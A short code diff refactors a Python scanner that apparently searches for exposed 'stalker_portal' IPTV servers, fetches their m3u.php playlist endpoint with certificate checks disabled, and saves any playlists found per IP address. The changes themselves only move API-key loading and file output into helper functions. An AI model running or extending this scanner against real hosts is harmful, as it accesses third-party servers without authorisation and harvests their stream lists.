@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOUR API KEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'title:"stalker_portal"'
 FILE = "/stalker_portal/server/tools/m3u.php"
 session = requests.Session()
@@ -34,7 +40,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=15, verify=False)
 		result = response.text
 		if '#EXTM3U' in result:
-			text_file = open("./cfg/stalker-"+IP+".m3u8", "a")
+			text_file = open_output("cfg/stalker-"+IP+".m3u8", "a")
 			text_file.write(""+result+"")
 			text_file.close()
 			print ("[*] Stalker... Found [*]\n")
